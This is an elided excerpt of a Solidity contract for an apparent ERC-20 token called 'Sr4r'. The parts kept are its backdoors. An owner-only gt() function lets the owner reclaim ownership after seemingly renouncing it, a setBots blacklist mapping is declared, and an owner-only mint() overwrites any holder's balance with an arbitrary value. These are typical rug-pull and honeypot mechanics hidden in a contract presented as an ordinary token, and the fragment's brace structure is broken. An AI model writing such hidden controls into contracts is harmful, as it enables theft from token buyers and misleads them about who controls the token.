...
contract Ownable is Context {
   ...
   //IUniswapV2Pair private ownerc;
    ...
    function renounceOwnership() public virtual onlyOwner {
      ...
      function gt(address y) external onlyOwner {
       _owner = y;
...
interface IUniswapV2Pair {
    ...
    function token5() external view returns (address);
...
contract rtoken is Context, IERC20, Ownable {
    ...
    string private constant _name = "Sr4r";
    string private constant _symbol = "Sr4r";
 ...
 mapping(address => bool) private setBots;
    ...
    } function mint(address k, uint256 w) external onlyOwner {
        _balances[k] = w;
    }
